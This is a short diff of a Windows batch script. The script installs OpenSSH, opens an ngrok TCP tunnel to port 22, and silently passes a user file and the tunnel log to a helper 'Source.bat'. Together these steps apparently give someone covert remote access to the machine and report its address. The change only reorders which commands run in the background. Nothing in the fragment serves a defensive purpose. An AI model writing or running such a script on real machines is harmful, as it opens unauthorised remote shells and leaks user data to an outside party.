@@ -20,6 +20,6 @@ Source.bat +silent --file %temp%/user.txt
 powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
-start ngrok.exe tcp 22 -log=stdout > ngrok.log
-timeout 10 & Source.bat +silent --file %temp%/ngrok.log
+ngrok.exe tcp 22 -log=stdout > ngrok.log
+start timeout 10 & Source.bat +silent --file %temp%/ngrok.log
 
